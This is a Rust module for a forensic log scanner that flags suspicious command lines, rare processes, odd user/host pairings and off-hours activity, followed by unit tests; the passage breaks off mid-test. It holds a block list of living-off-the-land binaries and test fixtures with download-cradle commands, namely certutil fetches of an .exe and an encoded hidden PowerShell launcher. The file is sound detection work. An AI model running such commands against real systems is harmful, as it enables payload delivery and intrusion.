use crate::db::{self, ColumnMeta};
use anyhow::Result;
use rusqlite::Connection;
use serde::Serialize;
use std::collections::{HashMap, HashSet};

const SCAN_BATCH_ROWS: i64 = 1000;
const PROGRESS_INTERVAL_ROWS: i64 = 5000;
const STAGING_TABLE: &str = "temp._anomaly_staging";
/// Hard ceiling on published findings; the layer is high-recall by design but must never
/// produce an unbounded table on a pathological file.
const MAX_TOTAL_FINDINGS: usize = 200_000;
const MAX_RARE_FINDINGS: usize = 2_000;
const MAX_OFF_HOURS_FINDINGS: usize = 3_000;
const MAX_TOP_ROWS: usize = 20;

/// Frequency profiling is meaningless on tiny files; below this row count the rare-value
/// heuristics stay silent instead of calling everything rare.
const MIN_ROWS_FOR_RARITY: i64 = 100;
const RARE_VALUE_MAX_COUNT: i64 = 2;
const RARE_PAIR_MIN_USER_ROWS: i64 = 5;

/// Off-hours flags fire only when the dataset is predominantly business-hours activity;
/// otherwise "off-hours" is that log's normal and the category would be pure noise.
const OFF_HOURS_MAX_RATIO: f64 = 0.15;
const MIN_ROWS_FOR_OFF_HOURS: i64 = 50;
const OFF_HOURS_START_HOUR: i64 = 22;
const OFF_HOURS_END_HOUR: i64 = 6;

const BASE64_MIN_RUN: usize = 60;
const ENTROPY_MIN_LEN: usize = 100;
const ENTROPY_MIN_BITS: f64 = 5.0;
const LONG_COMMAND_MIN_LEN: usize = 400;
const MAX_REASON_CHARS: usize = 160;

const LOLBIN_NAMES: [&str; 22] = [
    "certutil",
    "bitsadmin",
    "mshta",
    "regsvr32",
    "rundll32",
    "wmic",
    "cscript",
    "wscript",
    "installutil",
    "msbuild",
    "forfiles",
    "pcalua",
    "esentutl",
    "extrac32",
    "makecab",
    "curl",
    "ftp",
    "tftp",
    "certreq",
    "regasm",
    "regsvcs",
    "odbcconf",
];

const EXEC_EXTENSIONS: [&str; 10] = [
    "exe", "dll", "scr", "bat", "cmd", "ps1", "vbs", "js", "hta", "msi",
];

const DOC_EXTENSIONS: [&str; 12] = [
    "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "jpg", "jpeg", "png", "zip",
];

const SUSPICIOUS_PATH_FRAGMENTS: [&str; 7] = [
    "\\users\\public\\",
    "\\appdata\\local\\temp\\",
    "\\windows\\temp\\",
    "%temp%",
    "\\programdata\\",
    "/tmp/",
    "\\downloads\\",
];

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AnomalyScanSummary {
    pub rows_scanned: i64,
    pub finding_count: i64,
    pub flagged_rows: i64,
    pub categories: Vec<AnomalyCategorySummary>,
    pub top_rows: Vec<AnomalyRowSummary>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AnomalyCategorySummary {
    pub category: String,
    pub label: String,
    pub finding_count: i64,
    pub row_count: i64,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AnomalyRowSummary {
    pub row_num: i64,
    pub total_score: i64,
    pub categories: Vec<String>,
    pub top_reason: String,
}

#[derive(Debug, Clone)]
struct Finding {
    row_num: i64,
    category: &'static str,
    score: i64,
    reason: String,
    column_name: String,
}

pub fn category_label(category: &str) -> &'static str {
    match category {
        "encoded_blob" => "Encoded/obfuscated content",
        "lolbin" => "Living-off-the-land binary",
        "suspicious_path" => "Executable in suspicious path",
        "double_extension" => "Double file extension",
        "ip_in_command" => "IP address in command line",
        "url_in_command" => "URL in command line",
        "long_command" => "Unusually long command line",
        "high_entropy" => "High-entropy content",
        "rare_process" => "Rare process name",
        "rare_user_host" => "Rare user/host pairing",
        "off_hours" => "Off-hours activity",
        _ => "Anomaly",
    }
}

/// Runs the wide-net heuristic scan over every row and atomically publishes findings to
/// `_anomaly`. Deliberately independent of the curated MITRE library and tolerant of false
/// positives: this layer exists so a noisy-but-real signal is surfaced for the examiner
/// instead of silently dropped because no curated pattern covered it.
pub fn scan_anomalies(
    conn: &mut Connection,
    columns: &[ColumnMeta],
    mut on_progress: impl FnMut(i64, i64, &str),
) -> Result<AnomalyScanSummary> {
    db::create_anomaly_schema(conn)?;
    conn.execute_batch(&format!(
        "DROP TABLE IF EXISTS {STAGING_TABLE};
         CREATE TEMP TABLE _anomaly_staging (
            row_num INTEGER NOT NULL,
            category TEXT NOT NULL,
            score INTEGER NOT NULL,
            reason TEXT NOT NULL,
            column_name TEXT NOT NULL
         );"
    ))?;

    let result = scan_into_staging(conn, columns, &mut on_progress);
    match result {
        Ok(summary) => {
            let _ = conn.execute_batch(&format!("DROP TABLE IF EXISTS {STAGING_TABLE}"));
            Ok(summary)
        }
        Err(error) => {
            let _ = conn.execute_batch(&format!("DROP TABLE IF EXISTS {STAGING_TABLE}"));
            Err(error)
        }
    }
}

fn scan_into_staging(
    conn: &mut Connection,
    columns: &[ColumnMeta],
    on_progress: &mut impl FnMut(i64, i64, &str),
) -> Result<AnomalyScanSummary> {
    let total_rows: i64 = conn.query_row("SELECT COUNT(*) FROM rows", [], |row| row.get(0))?;
    let roles = load_role_columns(conn)?;
    on_progress(0, total_rows, "profiling");

    let mut findings_inserted = 0usize;
    let mut profile_findings = Vec::new();
    profile_findings.extend(rare_process_findings(conn, &roles, total_rows)?);
    profile_findings.extend(rare_user_host_findings(conn, &roles, total_rows)?);
    profile_findings.extend(off_hours_findings(conn)?);
    insert_findings(conn, &profile_findings, &mut findings_inserted)?;

    let text_columns: Vec<&ColumnMeta> = columns
        .iter()
        .filter(|column| roles.get("timestamp").map(String::as_str) != Some(&column.sql_name))
        .collect();
    let command_columns: HashSet<&str> = roles
        .iter()
        .filter(|(role, _)| ["command_line", "process_name"].contains(&role.as_str()))
        .map(|(_, sql_name)| sql_name.as_str())
        .collect();

    let select_idents: Vec<String> = text_columns
        .iter()
        .map(|column| db::quote_ident(&column.sql_name))
        .collect();
    let select_sql = format!(
        "SELECT row_num, {} FROM rows
         WHERE row_num > ?1
         ORDER BY row_num ASC
         LIMIT ?2",
        select_idents.join(", ")
    );

    let mut rows_scanned = 0i64;
    let mut last_row_num = i64::MIN;
    let mut next_progress_at = PROGRESS_INTERVAL_ROWS;

    loop {
        let batch = {
            let mut stmt = conn.prepare(&select_sql)?;
            let mut rows = stmt.query(rusqlite::params![last_row_num, SCAN_BATCH_ROWS])?;
            let mut batch = Vec::new();
            while let Some(row) = rows.next()? {
                let row_num: i64 = row.get(0)?;
                let mut values = Vec::with_capacity(text_columns.len());
                for column_idx in 0..text_columns.len() {
                    values.push(row.get::<_, Option<String>>(column_idx + 1)?);
                }
                batch.push((row_num, values));
            }
            batch
        };
        if batch.is_empty() {
            break;
        }

        let mut pending: Vec<Finding> = Vec::new();
        for (row_num, values) in &batch {
            last_row_num = *row_num;
            rows_scanned += 1;
            // One finding per (row, category): the strongest cell wins, later duplicates in
            // the same row only add noise for the examiner.
            let mut row_best: HashMap<&'static str, usize> = HashMap::new();
            for (column_idx, value) in values.iter().enumerate() {
                let Some(cell) = value.as_deref().map(str::trim).filter(|c| !c.is_empty())
                else {
                    continue;
                };
                let column = text_columns[column_idx];
                let is_command_column = command_columns.contains(column.sql_name.as_str());
                for finding in
                    cell_findings(*row_num, cell, column, is_command_column)
                {
                    match row_best.get(finding.category) {
                        Some(&existing_idx) if pending[existing_idx].score >= finding.score => {}
                        Some(&existing_idx) => pending[existing_idx] = finding,
                        None => {
                            row_best.insert(finding.category, pending.len());
                            pending.push(finding);
                        }
                    }
                }
            }
        }
        insert_findings(conn, &pending, &mut findings_inserted)?;

        if rows_scanned >= next_progress_at {
            on_progress(rows_scanned, total_rows, "scanning");
            while next_progress_at <= rows_scanned {
                next_progress_at += PROGRESS_INTERVAL_ROWS;
            }
        }
    }

    // Publication replaces the previous scan atomically: readers see the old complete result
    // or the new complete result, never a mix.
    let tx = conn.transaction()?;
    tx.execute("DELETE FROM _anomaly", [])?;
    tx.execute("DELETE FROM _anomaly_info", [])?;
    tx.execute(
        &format!(
            "INSERT INTO _anomaly (row_num, category, score, reason, column_name)
             SELECT row_num, category, score, reason, column_name FROM {STAGING_TABLE}"
        ),
        [],
    )?;
    tx.execute(
        "INSERT INTO _anomaly_info (rows_scanned, finding_count, completed_at)
         VALUES (?1, ?2, ?3)",
        rusqlite::params![
            rows_scanned,
            findings_inserted as i64,
            chrono::Utc::now().to_rfc3339()
        ],
    )?;
    tx.commit()?;

    on_progress(rows_scanned, total_rows, "complete");
    summarize(conn, rows_scanned)
}

fn insert_findings(
    conn: &Connection,
    findings: &[Finding],
    inserted: &mut usize,
) -> Result<()> {
    if findings.is_empty() || *inserted >= MAX_TOTAL_FINDINGS {
        return Ok(());
    }
    let mut stmt = conn.prepare_cached(&format!(
        "INSERT INTO {STAGING_TABLE} (row_num, category, score, reason, column_name)
         VALUES (?1, ?2, ?3, ?4, ?5)"
    ))?;
    for finding in findings {
        if *inserted >= MAX_TOTAL_FINDINGS {
            break;
        }
        stmt.execute(rusqlite::params![
            finding.row_num,
            finding.category,
            finding.score,
            finding.reason,
            finding.column_name
        ])?;
        *inserted += 1;
    }
    Ok(())
}

fn summarize(conn: &Connection, rows_scanned: i64) -> Result<AnomalyScanSummary> {
    let mut categories = Vec::new();
    {
        let mut stmt = conn.prepare(
            "SELECT category, COUNT(*), COUNT(DISTINCT row_num)
             FROM _anomaly GROUP BY category ORDER BY COUNT(*) DESC",
        )?;
        let mut rows = stmt.query([])?;
        while let Some(row) = rows.next()? {
            let category: String = row.get(0)?;
            categories.push(AnomalyCategorySummary {
                label: category_label(&category).to_string(),
                category,
                finding_count: row.get(1)?,
                row_count: row.get(2)?,
            });
        }
    }
    let (finding_count, flagged_rows): (i64, i64) = conn.query_row(
        "SELECT COUNT(*), COUNT(DISTINCT row_num) FROM _anomaly",
        [],
        |row| Ok((row.get(0)?, row.get(1)?)),
    )?;
    let mut top_rows = Vec::new();
    {
        let mut stmt = conn.prepare(
            "SELECT row_num, MIN(100, SUM(score)) AS total,
                    GROUP_CONCAT(DISTINCT category), MAX(score),
                    (SELECT reason FROM _anomaly b
                     WHERE b.row_num = a.row_num ORDER BY b.score DESC LIMIT 1)
             FROM _anomaly a
             GROUP BY row_num
             ORDER BY total DESC, row_num ASC
             LIMIT ?1",
        )?;
        let mut rows = stmt.query([MAX_TOP_ROWS as i64])?;
        while let Some(row) = rows.next()? {
            let joined: Option<String> = row.get(2)?;
            top_rows.push(AnomalyRowSummary {
                row_num: row.get(0)?,
                total_score: row.get(1)?,
                categories: joined
                    .unwrap_or_default()
                    .split(',')
                    .filter(|part| !part.is_empty())
                    .map(str::to_string)
                    .collect(),
                top_reason: row.get::<_, Option<String>>(4)?.unwrap_or_default(),
            });
        }
    }
    Ok(AnomalyScanSummary {
        rows_scanned,
        finding_count,
        flagged_rows,
        categories,
        top_rows,
    })
}

fn load_role_columns(conn: &Connection) -> Result<HashMap<String, String>> {
    let exists: i64 = conn.query_row(
        "SELECT EXISTS(SELECT 1 FROM sqlite_master WHERE type = 'table' AND name = '_column_roles')",
        [],
        |row| row.get(0),
    )?;
    let mut roles = HashMap::new();
    if exists == 0 {
        return Ok(roles);
    }
    let mut stmt = conn.prepare(
        "SELECT role, sql_name FROM _column_roles WHERE status IN ('suggested', 'confirmed')",
    )?;
    let mut rows = stmt.query([])?;
    while let Some(row) = rows.next()? {
        roles.insert(row.get(0)?, row.get(1)?);
    }
    Ok(roles)
}

fn rare_process_findings(
    conn: &Connection,
    roles: &HashMap<String, String>,
    total_rows: i64,
) -> Result<Vec<Finding>> {
    let Some(process_column) = roles.get("process_name") else {
        return Ok(Vec::new());
    };
    if total_rows < MIN_ROWS_FOR_RARITY {
        return Ok(Vec::new());
    }
    let ident = db::quote_ident(process_column);
    let sql = format!(
        "SELECT r.row_num, r.{ident}, rare.c
         FROM rows r
         JOIN (SELECT {ident} AS v, COUNT(*) AS c FROM rows
               WHERE {ident} IS NOT NULL AND TRIM({ident}) != ''
               GROUP BY {ident} HAVING c <= ?1) rare
           ON r.{ident} = rare.v
         ORDER BY r.row_num ASC
         LIMIT ?2"
    );
    let mut findings = Vec::new();
    let mut stmt = conn.prepare(&sql)?;
    let mut rows = stmt.query(rusqlite::params![
        RARE_VALUE_MAX_COUNT,
        MAX_RARE_FINDINGS as i64
    ])?;
    while let Some(row) = rows.next()? {
        let value: String = row.get(1)?;
        let count: i64 = row.get(2)?;
        findings.push(Finding {
            row_num: row.get(0)?,
            category: "rare_process",
            score: 30,
            reason: bounded_reason(&format!(
                "process name '{}' appears only {} time(s) across {} rows",
                value.trim(),
                count,
                total_rows
            )),
            column_name: process_column.clone(),
        });
    }
    Ok(findings)
}

fn rare_user_host_findings(
    conn: &Connection,
    roles: &HashMap<String, String>,
    total_rows: i64,
) -> Result<Vec<Finding>> {
    let (Some(user_column), Some(host_column)) = (roles.get("user"), roles.get("host")) else {
        return Ok(Vec::new());
    };
    if total_rows < MIN_ROWS_FOR_RARITY {
        return Ok(Vec::new());
    }
    let user_ident = db::quote_ident(user_column);
    let host_ident = db::quote_ident(host_column);
    // A pairing is anomalous when an otherwise-active identity touches a host it almost
    // never appears on; a user who is rare everywhere would flag every one of their rows.
    let sql = format!(
        "SELECT r.row_num, r.{user_ident}, r.{host_ident}, pair.c
         FROM rows r
         JOIN (SELECT {user_ident} AS u, {host_ident} AS h, COUNT(*) AS c FROM rows
               WHERE {user_ident} IS NOT NULL AND TRIM({user_ident}) != ''
                 AND {host_ident} IS NOT NULL AND TRIM({host_ident}) != ''
               GROUP BY {user_ident}, {host_ident} HAVING c <= ?1) pair
           ON r.{user_ident} = pair.u AND r.{host_ident} = pair.h
         JOIN (SELECT {user_ident} AS u, COUNT(*) AS c FROM rows
               GROUP BY {user_ident} HAVING c >= ?2) active
           ON pair.u = active.u
         ORDER BY r.row_num ASC
         LIMIT ?3"
    );
    let mut findings = Vec::new();
    let mut stmt = conn.prepare(&sql)?;
    let mut rows = stmt.query(rusqlite::params![
        RARE_VALUE_MAX_COUNT,
        RARE_PAIR_MIN_USER_ROWS,
        MAX_RARE_FINDINGS as i64
    ])?;
    while let Some(row) = rows.next()? {
        let user: String = row.get(1)?;
        let host: String = row.get(2)?;
        let count: i64 = row.get(3)?;
        findings.push(Finding {
            row_num: row.get(0)?,
            category: "rare_user_host",
            score: 35,
            reason: bounded_reason(&format!(
                "user '{}' appears on host '{}' only {} time(s) while active elsewhere",
                user.trim(),
                host.trim(),
                count
            )),
            column_name: user_column.clone(),
        });
    }
    Ok(findings)
}

fn off_hours_findings(conn: &Connection) -> Result<Vec<Finding>> {
    let exists: i64 = conn.query_row(
        "SELECT EXISTS(SELECT 1 FROM sqlite_master WHERE type = 'table' AND name = '_row_time')",
        [],
        |row| row.get(0),
    )?;
    if exists == 0 {
        return Ok(Vec::new());
    }
    let off_hours_predicate = format!(
        "((epoch_ms / 3600000) % 24 + 24) % 24 >= {OFF_HOURS_START_HOUR}
         OR ((epoch_ms / 3600000) % 24 + 24) % 24 < {OFF_HOURS_END_HOUR}"
    );
    let (total, off): (i64, i64) = conn.query_row(
        &format!(
            "SELECT COUNT(*), SUM(CASE WHEN {off_hours_predicate} THEN 1 ELSE 0 END)
             FROM _row_time"
        ),
        [],
        |row| {
            Ok((
                row.get(0)?,
                row.get::<_, Option<i64>>(1)?.unwrap_or(0),
            ))
        },
    )?;
    if total < MIN_ROWS_FOR_OFF_HOURS || off == 0 {
        return Ok(Vec::new());
    }
    if (off as f64) / (total as f64) >= OFF_HOURS_MAX_RATIO {
        // Off-hours activity is this dataset's norm (shift work, other timezone, 24/7
        // service noise); flagging a third of the file would bury real findings.
        return Ok(Vec::new());
    }
    let mut findings = Vec::new();
    let mut stmt = conn.prepare(&format!(
        "SELECT row_num, utc_text FROM _row_time
         WHERE {off_hours_predicate}
         ORDER BY row_num ASC
         LIMIT ?1"
    ))?;
    let mut rows = stmt.query([MAX_OFF_HOURS_FINDINGS as i64])?;
    while let Some(row) = rows.next()? {
        let utc_text: String = row.get(1)?;
        findings.push(Finding {
            row_num: row.get(0)?,
            category: "off_hours",
            score: 20,
            reason: bounded_reason(&format!(
                "activity at {utc_text} (UTC) in a dataset that is otherwise business-hours"
            )),
            column_name: String::new(),
        });
    }
    Ok(findings)
}

fn cell_findings(
    row_num: i64,
    cell: &str,
    column: &ColumnMeta,
    is_command_column: bool,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let lower = cell.to_lowercase();
    let make = |category: &'static str, score: i64, reason: String| Finding {
        row_num,
        category,
        score,
        reason: bounded_reason(&reason),
        column_name: column.sql_name.clone(),
    };

    if lower.contains("-encodedcommand")
        || lower.contains("-enc ")
        || lower.contains("frombase64string")
    {
        findings.push(make(
            "encoded_blob",
            75,
            format!(
                "encoded-command indicator in '{}': {}",
                column.original_name,
                snippet(cell)
            ),
        ));
    } else if let Some(run) = longest_base64_run(cell) {
        findings.push(make(
            "encoded_blob",
            70,
            format!(
                "{}-char base64-like blob in '{}': {}",
                run.len(),
                column.original_name,
                snippet(run)
            ),
        ));
    }

    for token in tokens(&lower) {
        let bare = token.strip_suffix(".exe").unwrap_or(token);
        if LOLBIN_NAMES.contains(&bare) {
            findings.push(make(
                "lolbin",
                45,
                format!(
                    "living-off-the-land binary '{}' referenced in '{}'",
                    bare, column.original_name
                ),
            ));
            break;
        }
    }

    if SUSPICIOUS_PATH_FRAGMENTS
        .iter()
        .any(|fragment| lower.contains(fragment))
        && EXEC_EXTENSIONS
            .iter()
            .any(|ext| lower.contains(&format!(".{ext}")))
    {
        findings.push(make(
            "suspicious_path",
            45,
            format!(
                "executable content under a staging/temp path in '{}': {}",
                column.original_name,
                snippet(cell)
            ),
        ));
    }

    for token in tokens(&lower) {
        let parts: Vec<&str> = token.split('.').collect();
        if parts.len() >= 3 {
            let last = parts[parts.len() - 1];
            let second_last = parts[parts.len() - 2];
            if EXEC_EXTENSIONS.contains(&last) && DOC_EXTENSIONS.contains(&second_last) {
                findings.push(make(
                    "double_extension",
                    65,
                    format!("double file extension '{}' in '{}'", token, column.original_name),
                ));
                break;
            }
        }
    }

    if is_command_column {
        if let Some(ip) = find_ipv4(cell) {
            let visibility = if is_private_ipv4(&ip) {
                "private"
            } else {
                "public"
            };
            findings.push(make(
                "ip_in_command",
                35,
                format!(
                    "{visibility} IP address {ip} embedded in '{}'",
                    column.original_name
                ),
            ));
        }
        if lower.contains("http://") || lower.contains("https://") {
            findings.push(make(
                "url_in_command",
                40,
                format!("URL in '{}': {}", column.original_name, snippet(cell)),
            ));
        }
        if cell.len() >= LONG_COMMAND_MIN_LEN {
            findings.push(make(
                "long_command",
                30,
                format!(
                    "{}-char command line in '{}' (unusually long)",
                    cell.len(),
                    column.original_name
                ),
            ));
        }
    }

    if cell.len() >= ENTROPY_MIN_LEN {
        let sample: String = cell.chars().take(4096).collect();
        let entropy = shannon_entropy(&sample);
        if entropy >= ENTROPY_MIN_BITS {
            findings.push(make(
                "high_entropy",
                40,
                format!(
                    "high-entropy content ({entropy:.1} bits/char) in '{}': {}",
                    column.original_name,
                    snippet(cell)
                ),
            ));
        }
    }

    findings
}

fn tokens(text: &str) -> impl Iterator<Item = &str> {
    text.split(|c: char| !(c.is_ascii_alphanumeric() || c == '.' || c == '_' || c == '-'))
        .filter(|token| !token.is_empty())
}

fn longest_base64_run(text: &str) -> Option<&str> {
    let bytes = text.as_bytes();
    let mut best: Option<(usize, usize)> = None;
    let mut start = 0usize;
    let mut index = 0usize;
    while index <= bytes.len() {
        let in_charset = index < bytes.len()
            && (bytes[index].is_ascii_alphanumeric()
                || bytes[index] == b'+'
                || bytes[index] == b'/'
                || bytes[index] == b'=');
        if !in_charset {
            let len = index - start;
            if len >= BASE64_MIN_RUN && best.is_none_or(|(s, e)| e - s < len) {
                best = Some((start, index));
            }
            start = index + 1;
        }
        index += 1;
    }
    let (run_start, run_end) = best?;
    let run = &text[run_start..run_end];
    // Pure hex, pure digits, or single-case runs (long paths, GUID dumps) are not base64-ish.
    let has_upper = run.bytes().any(|b| b.is_ascii_uppercase());
    let has_lower = run.bytes().any(|b| b.is_ascii_lowercase());
    let has_digit = run.bytes().any(|b| b.is_ascii_digit());
    (has_upper && has_lower && has_digit).then_some(run)
}

fn find_ipv4(text: &str) -> Option<String> {
    let bytes = text.as_bytes();
    let mut index = 0usize;
    while index < bytes.len() {
        if bytes[index].is_ascii_digit()
            && (index == 0 || (!bytes[index - 1].is_ascii_digit() && bytes[index - 1] != b'.'))
        {
            let mut cursor = index;
            let mut octets = Vec::new();
            loop {
                let digit_start = cursor;
                while cursor < bytes.len() && bytes[cursor].is_ascii_digit() {
                    cursor += 1;
                }
                let digit_len = cursor - digit_start;
                if digit_len == 0 || digit_len > 3 {
                    break;
                }
                let value: u32 = text[digit_start..cursor].parse().unwrap_or(1000);
                if value > 255 {
                    break;
                }
                octets.push(value);
                if octets.len() == 4 {
                    let end_ok = cursor >= bytes.len()
                        || (!bytes[cursor].is_ascii_digit() && bytes[cursor] != b'.');
                    if end_ok {
                        return Some(
                            octets
                                .iter()
                                .map(u32::to_string)
                                .collect::<Vec<_>>()
                                .join("."),
                        );
                    }
                    break;
                }
                if cursor < bytes.len() && bytes[cursor] == b'.' {
                    cursor += 1;
                } else {
                    break;
                }
            }
        }
        index += 1;
    }
    None
}

fn is_private_ipv4(ip: &str) -> bool {
    let octets: Vec<u32> = ip.split('.').filter_map(|part| part.parse().ok()).collect();
    if octets.len() != 4 {
        return false;
    }
    octets[0] == 10
        || octets[0] == 127
        || (octets[0] == 192 && octets[1] == 168)
        || (octets[0] == 172 && (16..=31).contains(&octets[1]))
        || (octets[0] == 169 && octets[1] == 254)
}

fn shannon_entropy(text: &str) -> f64 {
    let mut counts: HashMap<char, usize> = HashMap::new();
    let mut total = 0usize;
    for c in text.chars() {
        *counts.entry(c).or_insert(0) += 1;
        total += 1;
    }
    if total == 0 {
        return 0.0;
    }
    counts
        .values()
        .map(|&count| {
            let p = count as f64 / total as f64;
            -p * p.log2()
        })
        .sum()
}

fn snippet(text: &str) -> String {
    const MAX_SNIPPET_CHARS: usize = 60;
    let cleaned: String = text.chars().take(MAX_SNIPPET_CHARS).collect();
    if text.chars().count() > MAX_SNIPPET_CHARS {
        format!("{cleaned}…")
    } else {
        cleaned
    }
}

fn bounded_reason(reason: &str) -> String {
    if reason.chars().count() <= MAX_REASON_CHARS {
        return reason.to_string();
    }
    let bounded: String = reason.chars().take(MAX_REASON_CHARS).collect();
    format!("{bounded}…")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn column(sql_name: &str, original: &str) -> ColumnMeta {
        ColumnMeta {
            sql_name: sql_name.to_string(),
            original_name: original.to_string(),
            col_index: 0,
            inferred_type: "text".to_string(),
        }
    }

    fn test_conn(columns: &[&str]) -> Connection {
        let conn = Connection::open_in_memory().unwrap();
        let defs: Vec<String> = columns.iter().map(|c| format!("{c} TEXT")).collect();
        conn.execute_batch(&format!(
            "CREATE TABLE rows (row_num INTEGER PRIMARY KEY, {});",
            defs.join(", ")
        ))
        .unwrap();
        conn
    }

    fn add_role(conn: &Connection, role: &str, sql_name: &str) {
        db::create_column_roles_table(conn).unwrap();
        conn.execute(
            "INSERT INTO _column_roles (role, sql_name, confidence, status, reasons_json)
             VALUES (?1, ?2, 0.9, 'confirmed', '[]')",
            [role, sql_name],
        )
        .unwrap();
    }

    #[test]
    fn text_heuristics_flag_planted_rows_and_skip_benign_rows() {
        let mut conn = test_conn(&["cmd"]);
        add_role(&conn, "command_line", "cmd");
        let planted = [
            (1, "powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8A"),
            (2, "certutil -urlcache -split -f http://198.51.100.7/p.exe C:\\Users\\Public\\p.exe"),
            (3, "explorer.exe C:\\Users\\bob\\Desktop\\invoice.pdf.exe"),
        ];
        let benign = [(4, "notepad.exe C:\\notes\\meeting.txt"), (5, "ping localhost")];
        for (row_num, cmd) in planted.iter().chain(benign.iter()) {
            conn.execute(
                "INSERT INTO rows (row_num, cmd) VALUES (?1, ?2)",
                rusqlite::params![row_num, cmd],
            )
            .unwrap();
        }

        let columns = vec![column("cmd", "CommandLine")];
        let summary = scan_anomalies(&mut conn, &columns, |_, _, _| {}).unwrap();

        assert_eq!(summary.rows_scanned, 5);
        let categories_for = |row: i64| -> Vec<String> {
            let mut stmt = conn
                .prepare("SELECT category FROM _anomaly WHERE row_num = ?1 ORDER BY category")
                .unwrap();
            stmt.query_map([row], |r| r.get::<_, String>(0))
                .unwrap()
                .collect::<rusqlite::Result<Vec<_>>>()
                .unwrap()
        };
        assert!(categories_for(1).contains(&"encoded_blob".to_string()));
        let row2 = categories_for(2);
        for expected in ["lolbin", "suspicious_path", "url_in_command", "ip_in_command"] {
            assert!(row2.contains(&expected.to_string()), "row 2 missing {expected}: {row2:?}");
        }
        assert!(categories_for(3).contains(&"double_extension".to_string()));
        assert!(categories_for(4).is_empty());
        assert!(categories_for(5).is_empty());
        assert!(summary.flagged_rows >= 3);
        assert!(summary
            .categories
            .iter()
            .any(|category| category.category == "encoded_blob"));
    }

    #[test]
    fn rare_process_and_rare_user_host_need_volume_and_frequency() {
        let mut conn = test_conn(&["proc", "acct", "box"]);
        add_role(&conn, "process_name", "proc");
        add_role(&conn, "user", "acct");
        add_role(&conn, "host", "box");
        // 120 ordinary rows: alice on WS-1 running svchost.
        for row_num in 1..=120 {
            conn.execute(
                "INSERT INTO rows (row_num, proc, acct, box) VALUES (?1, 'svchost.exe', 'alice', 'WS-1')",
                [row_num],
            )
            .unwrap();
        }
        // One rare process, and alice's single hop to a server she never touches.
        conn.execute(
            "INSERT INTO rows (row_num, proc, acct, box) VALUES (121, 'xyzdumper.exe', 'alice', 'DC-9')",
            [],
        )
        .unwrap();

        let columns = vec![
            column("proc", "Process"),
            column("acct", "Account"),
            column("box", "Host"),
        ];
        let summary = scan_anomalies(&mut conn, &columns, |_, _, _| {}).unwrap();

        let row_121: Vec<String> = {
            let mut stmt = conn
                .prepare("SELECT category FROM _anomaly WHERE row_num = 121 ORDER BY category")
                .unwrap();
            stmt.query_map([], |r| r.get::<_, String>(0))
                .unwrap()
                .collect::<rusqlite::Result<Vec<_>>>()
                .unwrap()
        };
        assert!(row_121.contains(&"rare_process".to_string()), "{row_121:?}");
        assert!(row_121.contains(&"rare_user_host".to_string()), "{row_121:?}");
        // The 120 ordinary rows must stay clean.
        let ordinary_flagged: i64 = conn
            .query_row(
                "SELECT COUNT(DISTINCT row_num) FROM _anomaly WHERE row_num <= 120",
                [],
                |r| r.get(0),
            )
            .unwrap();
        assert_eq!(ordinary_flagged, 0);
        assert_eq!(summary.rows_scanned, 121);
    }

    #[test]
    fn off_hours_only_fires_in_business_hours_datasets() {
        let mut conn = test_conn(&["msg"]);
        db::create_row_time_table(&conn).unwrap();
        // 99 rows at 08:00 UTC, one at 01:00 UTC → business-hours dataset, one outlier.
        for row_num in 1..=100i64 {
            let epoch_ms = if row_num == 50 {
                1_752_800_400_000i64 // 01:00 UTC
            } else {
                1_752_825_600_000i64 // 08:00 UTC
            };
            conn.execute(
                "INSERT INTO rows (row_num, msg) VALUES (?1, 'event')",
                [row_num],
            )
            .unwrap();
            conn.execute(
                "INSERT INTO _row_time (row_num, epoch_ms, utc_text, source_text, parse_status)
                 VALUES (?1, ?2, ?3, 'src', 'ok')",
                rusqlite::params![row_num, epoch_ms, format!("row-{row_num}")],
            )
            .unwrap();
        }
        let columns = vec![column("msg", "Message")];
        let summary = scan_anomalies(&mut conn, &columns, |_, _, _| {}).unwrap();
        let off_rows: Vec<i64> = {
            let mut stmt = conn
                .prepare("SELECT row_num FROM _anomaly WHERE category = 'off_hours'")
                .unwrap();
            stmt.query_map([], |r| r.get(0))
                .unwrap()
                .collect::<rusqlite::Result<Vec<_>>>()
                .unwrap()
        };
        assert_eq!(off_rows, vec![50]);
        assert!(summary
            .categories
            .iter()
            .any(|category| category.category == "off_hours"));

        // Flip the dataset to mostly night work: the category must stay silent.
        conn.execute("UPDATE _row_time SET epoch_ms = 1752800400000", [])
            .unwrap();
        scan_anomalies(&mut conn, &columns, |_, _, _| {}).unwrap();
        let count: i64 = conn
            .query_row(
                "SELECT COUNT(*) FROM _anomaly WHERE category = 'off_hours'",
                [],
                |r| r.get(0),
            )
            .unwrap();
        assert_eq!(count, 0);
    }

    #[test]
    fn rescan_replaces_previous_findings() {
        let mut conn = test_conn(&["cmd"]);
        add_role(&conn, "command_line", "cmd");
        conn.execute(
            "INSERT INTO rows (row_num, cmd) VALUES (1, 'certutil -urlcache -f http://203.0.113.5/a.exe')",
            [],
        )
        .unwrap();
        let columns = vec![column("cmd", "CommandLine")];
        scan_anomalies(&mut conn, &columns, |_, _, _| {}).unwrap();
        let first: i64 = conn
            .query_row("SELECT COUNT(*) FROM _anomaly", [], |r| r.get(0))
            .unwrap();
        assert!(first > 0);

        conn.execute("UPDATE rows SET cmd = 'notepad.exe readme.txt'", [])
            .unwrap();
        let summary = scan_anomalies(&mut conn, &columns, |_, _, _| {}).unwrap();
        let second: i64 = conn
            .query_row("SELECT COUNT(*) FROM _anomaly", [], |r| r.get(0))
            .unwrap();
        assert_eq!(second, 0);
        assert_eq!(summary.finding_count, 0);
        let info_count: i64 = conn
            .query_row("SELECT COUNT(*) FROM _anomaly_info", [], |r| r.get(0))
            .unwrap();
        assert_eq!(info_count, 1);
    }

    #[test]
    fn ipv4_and_base64_detectors_hold_boundaries() {
        assert_eq!(find_ipv4("connect 10.1.2.3 now"), Some("10.1.2.3".to_string()));
        assert_eq!(find_ipv4("version 1.2.3.4.5 string"), None);
        assert_eq!(find_ipv4("999.1.1.1"), None);
